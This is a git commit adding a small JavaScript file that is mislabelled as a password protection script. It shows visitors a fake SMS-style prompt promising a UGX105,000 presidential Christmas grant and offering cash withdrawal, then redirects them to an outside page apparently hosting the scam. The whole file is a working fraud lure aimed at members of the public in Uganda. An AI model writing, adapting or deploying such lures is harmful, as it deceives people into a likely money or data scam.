84aa7ddc40144c656d97de8dcf11cde159a9c99d
mfednewblog8 <nsikakimoh68@gmail.com>
2025-12-03 16:38:07 +0100

    Create active-ug.js

---
+++ active-ug.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW UGX105,000'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive the UGX105,000 Christmas Grant from the president. Please press OK to withdraw CASH now.',
+  'WITHDRAW UGX105,000'
+);
+if (password != 'WITHDRAW UGX105,000') {
+  location.href = 'https://ghrant.org/uganda-xmas.html';
+}
